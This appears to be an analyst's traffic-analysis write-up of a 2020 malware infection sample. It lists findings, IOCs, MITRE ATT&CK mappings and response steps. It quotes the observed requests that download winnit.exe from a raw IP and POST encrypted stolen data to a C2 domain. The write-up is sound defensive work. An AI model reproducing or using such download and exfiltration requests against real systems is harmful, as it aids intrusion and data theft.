* Source: malware-traffic-analysis.net - Quiethub	
* Day: 2020-11-13



\# Victim

* IP: 192.168.200.8 



\## Key Findings



\*\*Malware Downloading\*\*

* GET http://185.141.24.71/download/winnit.exe
* Downloading directly from raw IP, no domain
* Executable delivered over HTTP plaintext, no encryption



\*\*Data Exfiltration\*\*

* POST /submit.php?id=123429392 HTTP/1.1
* POST + Content-type: application/octet-stream = raw binary data send to C2
* HOST: random name + number pattern = classic malware domain  webintercom76delivery.net
* Fake User-Agent: MSIE 8.0 (IE8 not in use in 2020)
* Server reply: 200 OK, Content-Length: 0 = acknowledged, no response
* Body: 224 bytes encrypted binary = stolen data



\## IOCs

| Type    | Value                          | Role                    |

|---------|-------------------------------|-------------------------|

| IP      | 185.141.24.71                 | Malware hosting server  |

| Domain  | webintercom76delivery.net     | C2 exfiltration endpoint|

| URI     | /submit.php?id=123429392      | Exfiltration endpoint   |

| File    | winnit.exe                    | Malware payload         |



\## MITRE ATT\&CK Mapping

* T1105 - Ingress Tool Transfer: winnit.exe downloaded via HTTP
* T1041 - Exfiltration Over C2 Channel: POST /submit.php với binary data
* T1036 - Masquerading: Fake User-Agent MSIE 8.0
* T1132 - Data Encoding: Encrypted binary body before exfiltration



\## Conclusion

IP 192.168.200.8 was compromise. Attacker download malware payload (winnit.exe) from 185.141.24.71 via HTTP plaintext.

Malware then collected and exfiltrated 224 bytes of encryted data to webintercom76delivery.net via POST request.

Severity: High.

Next step: isolate machine , check process list at the time of infection, identify what data was stolen, find persistence mechanism.

